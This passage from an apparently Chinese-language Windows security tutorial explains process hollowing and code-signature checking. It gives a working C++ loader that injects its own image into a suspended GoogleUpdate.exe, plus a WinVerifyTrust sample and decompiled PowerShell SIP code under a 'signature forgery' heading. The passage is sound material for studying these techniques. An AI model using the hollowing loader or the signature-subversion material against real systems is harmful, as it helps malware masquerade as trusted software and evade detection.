<p>用CREATE_SUSPENDED标志能将任意程式执行并挂载为一个进程，且主线程是被暂停住的，尚未执行到执行程式装载器函数。此时暂停状态下进程的主线程的EIP指向线程共同路由函数<code>ntdll!RtlUserThreadStart</code>。该函数第一个参数放在EAX中，储存线程完成必要初始化后应返回哪里继续执行的位址，第二个参数放在EBX中，储存内核生成的该进程中PEB块位址。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span> (disable : 4996)</span></span><br><span class="line"><span class="function">BYTE* <span class="title">MapFileToMemory</span><span class="params">(LPCSTR filename, LONGLONG&amp; filelen)</span> </span>&#123;</span><br><span class="line">	FILE* fileptr;</span><br><span class="line">	BYTE* buffer;</span><br><span class="line">	fileptr = <span class="built_in">fopen</span>(filename, <span class="string">&quot;rb&quot;</span>);  <span class="comment">// Open the file in binary mode</span></span><br><span class="line">	<span class="built_in">fseek</span>(fileptr, <span class="number">0</span>, SEEK_END);          <span class="comment">// Jump to the end of the file</span></span><br><span class="line">	filelen = <span class="built_in">ftell</span>(fileptr);             <span class="comment">// Get the current byte offset in the file</span></span><br><span class="line">	<span class="built_in">rewind</span>(fileptr);                      <span class="comment">// Jump back to the beginning of the file</span></span><br><span class="line">	buffer = (BYTE*)<span class="built_in">malloc</span>((filelen + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>)); <span class="comment">// Enough memory for file + \0</span></span><br><span class="line">	<span class="built_in">fread</span>(buffer, filelen, <span class="number">1</span>, fileptr); <span class="comment">// Read in the entire file</span></span><br><span class="line">	<span class="built_in">fclose</span>(fileptr); <span class="comment">// Close the file</span></span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunPortableExecutable</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path, <span class="type">void</span>* Image)</span> </span>&#123;</span><br><span class="line">	PROCESS_INFORMATION PI = &#123;&#125;;</span><br><span class="line">	STARTUPINFOA SI = &#123;&#125;;</span><br><span class="line">	CONTEXT* CTX;</span><br><span class="line">	<span class="type">void</span>* pImageBase; <span class="comment">// Pointer to the image base</span></span><br><span class="line">	IMAGE_NT_HEADERS* NtHeader = <span class="built_in">PIMAGE_NT_HEADERS</span>((<span class="type">size_t</span>)Image + <span class="built_in">PIMAGE_DOS_HEADER</span>(Image)-&gt;e_lfanew);</span><br><span class="line">	IMAGE_SECTION_HEADER* SectionHeader = <span class="built_in">PIMAGE_SECTION_HEADER</span>((<span class="type">size_t</span>)NtHeader + <span class="built_in">sizeof</span>(*NtHeader));</span><br><span class="line">	<span class="comment">// Create a new instance of current process in suspended state, for the new image.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">CreateProcessA</span>(path, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>, CREATE_SUSPENDED, <span class="number">0</span>, <span class="number">0</span>, &amp;SI, &amp;PI)) &#123;</span><br><span class="line">		<span class="comment">// Allocate memory for the context.</span></span><br><span class="line">		CTX = <span class="built_in">LPCONTEXT</span>(<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(CTX), MEM_COMMIT, PAGE_READWRITE));</span><br><span class="line">		CTX-&gt;ContextFlags = CONTEXT_FULL; <span class="comment">// Context is allocated</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">GetThreadContext</span>(PI.hThread, <span class="built_in">LPCONTEXT</span>(CTX))) &#123;<span class="comment">//if context is in thread</span></span><br><span class="line">			pImageBase = <span class="built_in">VirtualAllocEx</span>(PI.hProcess, <span class="built_in">LPVOID</span>(NtHeader-&gt;OptionalHeader.ImageBase), NtHeader-&gt;OptionalHeader.SizeOfImage, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line">			<span class="comment">// File Mapping</span></span><br><span class="line">			<span class="built_in">WriteProcessMemory</span>(PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NtHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">				<span class="built_in">WriteProcessMemory</span>(PI.hProcess, <span class="built_in">LPVOID</span>((<span class="type">size_t</span>)pImageBase + SectionHeader[i].VirtualAddress), <span class="built_in">LPVOID</span>((<span class="type">size_t</span>)Image + SectionHeader[i].PointerToRawData), SectionHeader[i].SizeOfRawData, <span class="number">0</span>);</span><br><span class="line">			<span class="built_in">WriteProcessMemory</span>(PI.hProcess, <span class="built_in">LPVOID</span>(CTX-&gt;Ebx + <span class="number">8</span>), <span class="built_in">LPVOID</span>(&amp;pImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">			CTX-&gt;Eax = <span class="built_in">DWORD</span>(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">			<span class="built_in">SetThreadContext</span>(PI.hThread, <span class="built_in">LPCONTEXT</span>(CTX));</span><br><span class="line">			<span class="built_in">ResumeThread</span>(PI.hThread);</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> CALLBACK <span class="title">WinMain</span><span class="params">(HINSTANCE, HINSTANCE, LPSTR, <span class="type">int</span>)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> CurrentFilePath[MAX_PATH + <span class="number">1</span>];</span><br><span class="line">	<span class="built_in">GetModuleFileNameA</span>(<span class="number">0</span>, CurrentFilePath, MAX_PATH);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strstr</span>(CurrentFilePath, <span class="string">&quot;GoogleUpdate.exe&quot;</span>)) &#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;We Cool?&quot;</span>, <span class="string">&quot;30cm.tw&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">	LONGLONG len = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">RunPortableExecutable</span>(<span class="string">&quot;GoogleUpdate.exe&quot;</span>, <span class="built_in">MapFileToMemory</span>(CurrentFilePath, len));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="数位签名"><a href="#数位签名" class="headerlink" title="数位签名"></a>数位签名</h2><h3 id="签名伪造"><a href="#签名伪造" class="headerlink" title="签名伪造"></a>签名伪造</h3><p>数位签名的签署方式有两种：第一种，也是主流商业产品上采用的方式，就是嵌入式数位签名，其将验证用的签署咨询直接绑定在PE结构末端，方便程式档案再携带、复制或者发布同时一并将该程式签署咨询转移到洽谈电脑上进行验证。第二种，为分离式数位签名，将程式的指纹记录&#x2F;杂凑资讯储存于作业系统C:\Windows\System32\CatRoot中。</p>
<p>对于第二种，每个副档名为.cat的档案为按照ASN.1标准封装的记录，储存了档案文件名称与其对应的档案内容杂凑。该资料夹只有高权系统服务或提供UAC许可“权限提升Process”才能写入.cat指纹档案。</p>
<p>验证一个程式档案是否收到签署，且数位签章有效性：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _UNICODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNICODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Softpub.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wintrust.h&gt;</span></span></span><br><span class="line"><span class="comment">// Link with the Wintrust.lib file.</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;wintrust&quot;</span>)</span></span><br><span class="line"><span class="function">BOOL <span class="title">VerifyEmbeddedSignature</span><span class="params">(LPCWSTR pwszSourceFile)</span> </span>&#123;</span><br><span class="line">    LONG lStatus;</span><br><span class="line">    DWORD dwLastError;</span><br><span class="line">    <span class="comment">// Initialize the WINTRUST_FILE_INFO structure.</span></span><br><span class="line">    WINTRUST_FILE_INFO FileData; <span class="comment">//用于指名要受验证的程式档案在磁碟槽上的路径</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;FileData, <span class="number">0</span>, <span class="built_in">sizeof</span>(FileData));</span><br><span class="line">    FileData.cbStruct = <span class="built_in">sizeof</span>(WINTRUST_FILE_INFO);</span><br><span class="line">    FileData.pcwszFilePath = pwszSourceFile; <span class="comment">//指向受验证档案之路径</span></span><br><span class="line">    FileData.hFile = <span class="literal">NULL</span>;</span><br><span class="line">    FileData.pgKnownSubject = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    WVTPolicyGUID specifies the policy to apply on the file</span></span><br><span class="line"><span class="comment">    WINTRUST_ACTION_GENERIC_VERIFY_V2 policy checks:</span></span><br><span class="line"><span class="comment">    1) The certificate used to sign the file chains up to a root certificate located in the trusted root certificate store. This implies that the identity of the publisher has been verified by a certification authority.</span></span><br><span class="line"><span class="comment">    2) In cases where user interface is displayed (which this example does not do), WinVerifyTrust will check for whether the end entity certificate is stored in the trusted publisher store, implying that the user trusts content from this publisher.</span></span><br><span class="line"><span class="comment">    3) The end entity certificate has sufficient permission to sign code, as indicated by the presence of a code signing EKU or no EKU.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    GUID WVTPolicyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;</span><br><span class="line">    WINTRUST_DATA WinTrustData;</span><br><span class="line">    <span class="comment">// Initialize the WinVerifyTrust input data structure.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;WinTrustData, <span class="number">0</span>, <span class="built_in">sizeof</span>(WinTrustData));       <span class="comment">// Default all fields to 0.</span></span><br><span class="line">    WinTrustData.cbStruct = <span class="built_in">sizeof</span>(WinTrustData);</span><br><span class="line">    WinTrustData.pPolicyCallbackData = <span class="literal">NULL</span>;              <span class="comment">// Use default code signing EKU.</span></span><br><span class="line">    WinTrustData.pSIPClientData = <span class="literal">NULL</span>;                   <span class="comment">// No data to pass to SIP.</span></span><br><span class="line">    WinTrustData.dwUIChoice = WTD_UI_NONE;                <span class="comment">// Disable WVT UI.</span></span><br><span class="line">    WinTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;   <span class="comment">// No revocation checking.</span></span><br><span class="line">    WinTrustData.dwUnionChoice = WTD_CHOICE_FILE;         <span class="comment">// Verify an embedded signature on a file.</span></span><br><span class="line">    WinTrustData.dwStateAction = WTD_STATEACTION_VERIFY;  <span class="comment">// Verify action.</span></span><br><span class="line">    WinTrustData.hWVTStateData = <span class="literal">NULL</span>;                    <span class="comment">// Verification sets this value.</span></span><br><span class="line">    WinTrustData.pwszURLReference = <span class="literal">NULL</span>;                 <span class="comment">// Not used.</span></span><br><span class="line">    WinTrustData.dwUIContext = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Set pFile.</span></span><br><span class="line">    WinTrustData.pFile = &amp;FileData;</span><br><span class="line">    <span class="comment">// WinVerifyTrust verifies signatures as specified by the GUID and Wintrust_Data.</span></span><br><span class="line">    lStatus = <span class="built_in">WinVerifyTrust</span>(<span class="literal">NULL</span>, &amp;WVTPolicyGUID, &amp;WinTrustData);</span><br><span class="line">    <span class="keyword">switch</span> (lStatus) &#123;</span><br><span class="line">        <span class="keyword">case</span> ERROR_SUCCESS:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Signed file:</span></span><br><span class="line"><span class="comment">                - Hash that represents the subject is trusted.</span></span><br><span class="line"><span class="comment">                - Trusted publisher without any verification errors.</span></span><br><span class="line"><span class="comment">                - UI was disabled in dwUIChoice. No publisher or time stamp chain errors.</span></span><br><span class="line"><span class="comment">                - UI was enabled in dwUIChoice and the user clicked &quot;Yes&quot; when asked to install and run the signed subject.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;The file \&quot;%s\&quot; is signed and the signature was verified.\n&quot;</span>, pwszSourceFile);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">case</span> TRUST_E_NOSIGNATURE:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The file was not signed or had a signature that was not valid.</span></span><br><span class="line">            <span class="comment">// Get the reason for no signature.</span></span><br><span class="line">            dwLastError = <span class="built_in">GetLastError</span>();</span><br><span class="line">            <span class="keyword">if</span> (TRUST_E_NOSIGNATURE == dwLastError || TRUST_E_SUBJECT_FORM_UNKNOWN == dwLastError || TRUST_E_PROVIDER_UNKNOWN == dwLastError)</span><br><span class="line">                <span class="comment">// The file was not signed.</span></span><br><span class="line">                <span class="built_in">wprintf_s</span>(<span class="string">L&quot;The file \&quot;%s\&quot; is not signed.\n&quot;</span>, pwszSourceFile);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// The signature was not valid or there was an error opening the file.</span></span><br><span class="line">                <span class="built_in">wprintf_s</span>(<span class="string">L&quot;An unknown error occurred trying to verify the signature of the \&quot;%s\&quot; file.\n&quot;</span>, pwszSourceFile);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">case</span> TRUST_E_EXPLICIT_DISTRUST:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The hash that represents the subject or the publisher is not allowed by the admin or user.</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;The signature is present, but specifically disallowed.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">case</span> TRUST_E_SUBJECT_NOT_TRUSTED:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The user clicked &quot;No&quot; when asked to install and run.</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;The signature is present, but not trusted.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">case</span> CRYPT_E_SECURITY_SETTINGS:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The hash that represents the subject or the publisher was not explicitly trusted by the admin and the admin policy has disabled user trust. No signature, publisher or time stamp errors.</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;CRYPT_E_SECURITY_SETTINGS - The hash representing the subject or the publisher wasn&#x27;t explicitly trusted by the admin and admin policy has disabled user trust. No signature, publisher or timestamp errors.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The UI was disabled in dwUIChoice or the admin policy has disabled user trust. lStatus contains the publisher or time stamp chain error.</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;Error is: 0x%x.\n&quot;</span>, lStatus);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// Any hWVTStateData must be released by a call with close.</span></span><br><span class="line">    WinTrustData.dwStateAction = WTD_STATEACTION_CLOSE;</span><br><span class="line">    lStatus = <span class="built_in">WinVerifyTrust</span>(<span class="literal">NULL</span>, &amp;WVTPolicyGUID, &amp;WinTrustData);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">VerifyEmbeddedSignature</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在第29行处，<code>WINTRUST_ACTION_GENERIC_VERIFY_V2</code>指示当前要验证的档案是受Authenticode规格签署的数位签名后档案，该值代表是一串Windows COM Interface代号，使<code>WinVerifyTrust</code>透过不同GUID来选用不同COM Interface的DLL模组之导出函数进行验证是否有效。其他选项有HTTPSPROV_ACTION，被用在IE浏览器验证当前SSL&#x2F;TLS之HTTPS网路连线之对方数位签章是否有效，DRIVER_ACTION_VERIFY验证是否为有效Windows Hardware Quality Labs(WHQL)驱动档案。</p>
<p><code>WinVerifyTrust</code>返回值有：</p>
<table>
<thead>
<tr>
<th>结果</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>ERROR_SUCCESS</td>
<td>传入档案确实受到签名验证通过，且档案无损毁或遭篡改之疑虑。</td>
</tr>
<tr>
<td>TRUST_E_NOSIGNATURE</td>
<td>传入档案之签名内容不存在或具有无效数位签章。</td>
</tr>
<tr>
<td>TRUST_E_EXPLICIT_DISTRUST</td>
<td>传入档案具有有效签名且验证通过，但该签名效力被签署人或当前用户禁用从而无效。</td>
</tr>
<tr>
<td>TRUST_E_SUBJECT_NOT_TRUSTED</td>
<td>该安装该签名之证书到本地系统时被用户手动阻止导致此签名不被信任。</td>
</tr>
<tr>
<td>CRYPT_E_SECURITY_SETTINGS</td>
<td>该签名证书当前被网管设下的群组原则禁用，指纹计算结果不吻合当前传入档案，时间戳记异常等。</td>
</tr>
</tbody></table>
<p><code>WinVerifyTrust</code>具体细节看<a target="_blank" rel="noopener" href="https://specterops.io/wp-content/uploads/sites/3/2022/06/SpecterOps_Subverting_Trust_in_Windows.pdf%E3%80%82%E5%9C%A8Windows">https://specterops.io/wp-content/uploads/sites/3/2022/06/SpecterOps_Subverting_Trust_in_Windows.pdf。在Windows</a> 10时代的详解请看<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458286402&idx=3&sn=6eac85d87908e1ee132b09e852c17682&chksm=b18149c886f6c0de5efeb852f59c670353c5331f4fbbafccddd809a53e0d0d11c5bb237ac5f1&scene=27%E3%80%82%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AF%B7%E7%9C%8Bhttps://zhuanlan.zhihu.com/p/31083135%E3%80%82">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458286402&amp;idx=3&amp;sn=6eac85d87908e1ee132b09e852c17682&amp;chksm=b18149c886f6c0de5efeb852f59c670353c5331f4fbbafccddd809a53e0d0d11c5bb237ac5f1&amp;scene=27。数字签名劫持实战请看https://zhuanlan.zhihu.com/p/31083135。</a></p>
<p>由于不同种类档案其数位签名储存方式皆不同，因此微软体系下将每不同中档案验证方式都独立涉及一个COM Interface，即全局共享DLL模组，作为对应当前档案种类的Subject Interface Package(SIP)接口，并配有一组GUID能够反查SIP模组来使用。大致流程如下，“*”表示可选过程：</p>
<table>
<thead>
<tr>
<th>顺序</th>
<th>Trust Provider</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Initialization</td>
</tr>
<tr>
<td>2</td>
<td>Message</td>
</tr>
<tr>
<td>3</td>
<td>Signature</td>
</tr>
<tr>
<td>4</td>
<td>Certificate</td>
</tr>
<tr>
<td>5</td>
<td>CertCheck*</td>
</tr>
<tr>
<td>6</td>
<td>FinalPolicy</td>
</tr>
<tr>
<td>7</td>
<td>DiagnosticPolicy*</td>
</tr>
<tr>
<td>8</td>
<td>Cleanup*</td>
</tr>
</tbody></table>
<p>在上述Message阶段时，先后呼叫三个函数：</p>
<ol>
<li>在<code>Crypt32!CryptSIPDllsMyFileType</code>中将按顺序确认当前传入档案是PE、Catalog、CTL、Cabinet哪种类型并返回对应SIP接口GUID序号。倘若非上述4中，将从注册表中用<code>PsIsMyFileType</code>确认是否为PowerShell脚本、Windows MSI安装包、WIndows应用商店Appx程式等并返回对应SIP接口GUID序号。</li>
<li>在上个步骤提取出对应当前档案SIP的GUID后，用<code>Crypt32!CryptSIPGetSignedDataMsg</code>以对应SIP接口从当前档案提取签名资讯。</li>
<li>用<code>Crypt32!CryptSIPVerifyIndirectData</code>计算当前档案杂凑结果作为指纹，与上个步骤提取出的签名资讯比对，若杂凑结果一致则当前档案与签名当下的档案内容是完全一致的，若不一样则代表该档案在传输或复制过程中损毁或被植入后门、篡改后的档案。</li>
</ol>
<p>当然上述为设计理论，实践证明<code>PsIsMyFileType</code>的实现在C:\Windows\System32\WindowsPowerShell\v1.0\pwrshsip.dll，代码如下。<code>CryptSIPDllsMyFileType</code>并没有实现，而是查找注册表，并直接调用<code>pwrshsip!PsIsMyFileType</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">PsIsMyFileType</span><span class="params">(<span class="type">unsigned</span> __int16* a1, <span class="keyword">struct</span> _GUID* a2)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">wchar_t</span>* v4; <span class="comment">// rbp</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">    <span class="type">wchar_t</span>* String2[<span class="number">7</span>]; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (a2 &amp;&amp; (*a2 = <span class="number">0LL</span>, a1)) &#123;</span><br><span class="line">        v4 = <span class="built_in">wcsrchr</span>(a1, <span class="number">0x2E</span>u);</span><br><span class="line">        <span class="keyword">if</span> (v4) &#123;</span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">            String2[<span class="number">0</span>] = <span class="string">L&quot;ps1&quot;</span>;</span><br><span class="line">            String2[<span class="number">1</span>] = <span class="string">L&quot;ps1xml&quot;</span>;</span><br><span class="line">            String2[<span class="number">2</span>] = <span class="string">L&quot;psc1&quot;</span>;</span><br><span class="line">            String2[<span class="number">3</span>] = <span class="string">L&quot;psd1&quot;</span>;</span><br><span class="line">            String2[<span class="number">4</span>] = <span class="string">L&quot;psm1&quot;</span>;</span><br><span class="line">            String2[<span class="number">5</span>] = <span class="string">L&quot;cdxml&quot;</span>;</span><br><span class="line">            String2[<span class="number">6</span>] = <span class="string">L&quot;mof&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> (_wcsicmp(v4 + <span class="number">1</span>, String2[v5])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (++v5 &gt;= <span class="number">7</span>)</span><br><span class="line">                    <span class="keyword">return</span> v2;</span><br><span class="line">            &#125;</span><br><span class="line">            *a2 = guidPsSip;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">SetLastError</span>(<span class="number">0x57</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>稍微整理一下可得：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CRYPT_SUBJTYPE_POWERSHELL_IMAGE &#123;0x603BCC1F,0x4B59,0x4E08,&#123;0xB7,0x24,0xD2,0xC6,0x29,0x7E,0xF3,0x51&#125;&#125;</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">PsIsMyFileType</span><span class="params">(IN WCHAR* pwszFileName, OUT GUID* pgSubject)</span> 